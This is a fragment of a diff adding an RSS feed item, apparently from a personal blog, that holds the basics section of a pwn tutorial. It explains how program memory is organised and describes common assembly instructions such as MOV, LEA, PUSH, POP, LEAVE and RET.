+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/mem.png&#34;
+	width=&#34;1355&#34;
+	height=&#34;711&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/mem_huae9965f5cba59206b56105b8aa15edc0_63508_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/mem_huae9965f5cba59206b56105b8aa15edc0_63508_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Organization of Program Data in Memory&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;190&#34;
+		data-flex-basis=&#34;457px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Let&amp;rsquo;s assume everyone has a bit of C foundation here&lt;/p&gt;
+&lt;p&gt;Not going off-topic anymore&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;A few points to note here&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;The stack grows &lt;del&gt;downward&lt;/del&gt; from high to low address&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;The heap grows from low to high address&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Data is written from low to high address&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;BSS stores global variables&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;The stack stores local variables&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;assembly-alert&#34;&gt;Assembly Alert!&lt;/h2&gt;
+&lt;p&gt;For assembly, you only need to know the most basic instructions =  =&lt;/p&gt;
+&lt;p&gt;Since we&amp;rsquo;ve written so much =   =&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s continue&amp;hellip;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;Some Common Assembly Instructions&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/asm.png&#34;
+	width=&#34;1354&#34;
+	height=&#34;711&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/asm_hudd3b919f86ee6bd3673bb8c9e0238d19_36486_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/asm_hudd3b919f86ee6bd3673bb8c9e0238d19_36486_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Common Assembly Instructions&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;190&#34;
+		data-flex-basis=&#34;457px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;Usage&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;MOV&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;DEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;ADDRESS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SRC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;VALUE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;; Transfer the source operand to the destination (similar to an assignment statement)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;LEA&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;REG&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SRC&lt;/span&gt;                   &lt;span class=&#34;c1&#34;&gt;; Send the effective address of the source operand to the specified register (save SRC&amp;#39;s address into…)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;PUSH&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;VALUE&lt;/span&gt;                     &lt;span class=&#34;c1&#34;&gt;; Push the target value onto the stack, while decreasing the SP pointer by 1 word length&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;POP&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;DEST&lt;/span&gt;                       &lt;span class=&#34;c1&#34;&gt;; Pop the value from the top of the stack to the destination storage position, while increasing the SP pointer by 1 word length&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;LEAVE&lt;/span&gt;                          &lt;span class=&#34;c1&#34;&gt;; Instruction to restore the parent function&amp;#39;s stack frame when returning from a function (destroy the child function&amp;#39;s stack frame after the child function call ends)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;RET&lt;/span&gt;                            &lt;span class=&#34;c1&#34;&gt;; Instruction to control the program execution flow to return to the parent function when returning from a function&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;
+&lt;p&gt;translations by &lt;strong&gt;GPT-4&lt;/strong&gt;&lt;/p&gt;
+</description>
+        </item>
+        
     </channel>
 </rss>
